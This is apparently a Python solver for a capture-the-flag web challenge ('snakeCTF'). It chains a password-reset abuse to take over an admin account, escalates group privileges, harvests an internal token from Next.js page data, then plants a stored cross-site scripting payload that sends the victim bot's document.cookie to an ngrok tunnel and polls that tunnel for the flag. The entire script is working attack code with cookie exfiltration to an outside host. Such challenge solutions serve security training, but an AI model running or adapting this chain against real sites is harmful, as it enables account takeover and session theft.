#!/usr/bin/env python3

from pyngrok import conf, ngrok
from bs4 import BeautifulSoup
from time import sleep
import requests
import urllib3
import json
import sys
import os
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PORT = 5000

if len(sys.argv) == 1:
    print(f"Usage: {sys.argv[0]} https://url.for.challenge.tld")
    exit(1)
url = sys.argv[1]

def extract_nextjs_props(res):
    soup = BeautifulSoup(res.text, "html.parser")
    
    script_tag = soup.find("script", {"id": "__NEXT_DATA__"})
    if not script_tag:
        raise ValueError("No __NEXT_DATA__ script tag found")

    data = json.loads(script_tag.string)
    return data.get("props", {})

pyngrok_config = conf.PyngrokConfig(ngrok_path=None, config_path=None, auth_token=None, region=None, monitor_thread=True, log_event_callback=None,
                                    startup_timeout=15, max_logs=100, request_timeout=4, start_new_session=False, ngrok_version='v3', api_key=None)
conf.set_default(pyngrok_config)
n = ngrok.connect(PORT)

s = requests.Session()
s.verify = False

response = s.patch(
    url + "/api/auth/forgot",
    json={
        "token": "1",
        "newPassword": "Password1234!",
    }
)

response = s.post(
    url + "/api/auth/signin",
    json={
        "email": "admin@spam.gov.it",
        "password": "Password1234!",
    }
)
token = response.text

response = s.post(
    url + "/api/actions",
    headers={
        "Authorization": f"Bearer {token}",
    },
    json={
        "action": "assignGroup",
        "params": {
            "userId": 0,
            "groupId": 0
        }
    }
)

response = s.get(
    url + "/authorize?serviceId=0",
    headers={
        "Cookie": f"token={token}",
    }
)

props = extract_nextjs_props(response)
authToken = props.get("pageProps").get("token", "")

response = s.post(
    url + "/api/internal/sync?id=0",
    headers={
        "Authorization": f"Bearer {authToken}",
    },
    json={
        "firstName": f"<script>fetch('{n.public_url}?cookie=' + document.cookie)</script>"
    }
)

response = s.post(
    url + "/api/actions",
    headers={
        "Authorization": f"Bearer {token}",
    },
    json={
        "action": "healthCheck",
        "params": {
            "platform": 0,
        }
    }
)

run = 0
while run < 4:
    sleep(5)
    API_URL = "http://localhost:4040/api/requests/http"
    response = s.get(API_URL).json()
    if len(response["requests"]) > 0:
        cookie = response["requests"][0]["request"]["uri"].replace(
            "/?cookie=", "")
        flag = re.search(r"snakeCTF{.*}", cookie).group(0)
        print(flag)
        exit(0)
    run += 1
print("no flag :-(")